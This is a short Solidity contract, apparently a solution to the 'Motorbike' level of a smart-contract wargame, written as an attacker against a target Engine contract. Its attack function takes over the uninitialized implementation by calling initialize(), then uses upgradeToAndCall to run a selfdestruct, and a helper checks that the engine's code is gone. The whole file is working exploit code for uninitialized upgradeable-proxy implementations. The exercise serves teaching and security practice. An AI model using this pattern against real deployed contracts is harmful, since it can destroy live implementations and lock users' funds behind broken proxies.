// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "./target/Motorbike.sol";

contract MotorbikeAttacker {
    function attack(address _engine) public {
        Engine engine = Engine(_engine);
        engine.initialize();
        engine.upgradeToAndCall(address(this), abi.encodeWithSignature("destroy()"));
    }

    function destroy() public {
        selfdestruct(payable(address(this)));
    }

    function works(address _engine) public view returns (bool) {
        if (Address.isContract(_engine)) {
            return false;
        }
        return true;
    }
}
